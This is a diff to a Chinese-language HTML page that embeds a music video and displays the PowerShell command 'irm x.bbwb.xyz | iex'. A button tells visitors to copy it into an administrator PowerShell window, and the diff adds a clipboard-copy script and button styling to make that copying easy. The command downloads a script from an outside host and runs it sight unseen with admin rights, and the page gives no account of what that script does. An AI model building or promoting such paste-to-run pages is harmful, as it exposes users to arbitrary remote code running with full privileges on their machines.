@@ -21,6 +21,13 @@
             max-width: 600px; /* 最大宽度为 600px */
             margin: 20px 0;
         }
+        /* 给按钮加一点鼠标反馈，保持原有浏览器默认样式基础上增加 pointer */
+        button {
+            cursor: pointer;
+            margin-top: 8px;
+            padding: 8px 16px;
+            font-size: 1rem;
+        }
     </style>
 </head>
 <body>
@@ -29,9 +36,89 @@
         <source src="https://one.bbwb.xyz/ichat008/%E7%BA%AF%E9%9F%B3%E4%B9%90%E6%AC%A3%E8%B5%8F%EF%BC%9A%E5%90%AF%E7%A8%8B.mp4" type="video/mp4">
         你的浏览器不支持 video 标签。
     </video>
+    <!-- 命令展示区域：复制时会从此处获取文本 -->
     <p>irm x.bbwb.xyz | iex</p>
-    <a href="" > <button>拷贝上方命令到管理员Powershell窗口中</button> </a>
+    <!-- 移除了无用的<a>包裹，直接使用按钮，并绑定复制功能 -->
+    <button id="copyBtn">拷贝上方命令到管理员Powershell窗口中</button>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // 获取按钮和显示命令的段落
+            const copyBtn = document.getElementById('copyBtn');
+            const commandParagraph = document.querySelector('p');
+
+            // 如果没有找到按钮或段落，则不执行任何操作（保护性判断）
+            if (!copyBtn || !commandParagraph) return;
+
+            // 核心复制函数
+            async function copyCommandToClipboard() {
+                // 从 <p> 标签中获取要复制的命令，并去除首尾空格
+                const command = commandParagraph.innerText.trim();
+
+                // 保存按钮原始文本，用于恢复
+                const originalBtnText = copyBtn.innerText;
+
+                // 定义成功处理函数（显示“已复制!”并恢复）
+                const handleSuccess = () => {
+                    copyBtn.innerText = '已复制!';
+                    setTimeout(() => {
+                        copyBtn.innerText = originalBtnText;
+                    }, 1500);
+                };
+
+                // 定义失败处理函数
+                const handleFailure = (error) => {
+                    console.warn('复制失败:', error);
+                    alert('复制失败，请手动选择命令后复制 (Ctrl+C)。\n错误详情: ' + (error?.message || '未知错误'));
+                };
+
+                // 优先使用现代 Clipboard API (支持大多数现代浏览器)
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    try {
+                        await navigator.clipboard.writeText(command);
+                        handleSuccess();
+                    } catch (err) {
+                        handleFailure(err);
+                    }
+                } else {
+                    // 降级方案：使用 document.execCommand('copy') 老式方法
+                    // 创建临时 textarea 元素
+                    const textArea = document.createElement('textarea');
+                    textArea.value = command;
+
+                    // 使 textarea 不可见
+                    textArea.style.position = 'fixed';
+                    textArea.style.left = '-9999px';
+                    textArea.style.top = '0';
+                    document.body.appendChild(textArea);
+
+                    // 选中文本
+                    textArea.select();
+                    textArea.setSelectionRange(0, 99999); // 对于移动设备更友好
+
+                    try {
+                        // 执行复制命令
+                        const successful = document.execCommand('copy');
+                        if (successful) {
+                            handleSuccess();
+                        } else {
+                            throw new Error('execCommand 返回 false');
+                        }
+                    } catch (err) {
+                        handleFailure(err);
+                    } finally {
+                        // 清理临时元素
+                        document.body.removeChild(textArea);
+                    }
+                }
+            }
+
+            // 绑定点击事件
+            copyBtn.addEventListener('click', copyCommandToClipboard);
+        })();
+    </script>
+    <!-- 小提示：样式微调仅增加按钮指针，其余外观与原设计保持一致 -->
 </body>
 </html>
-
-
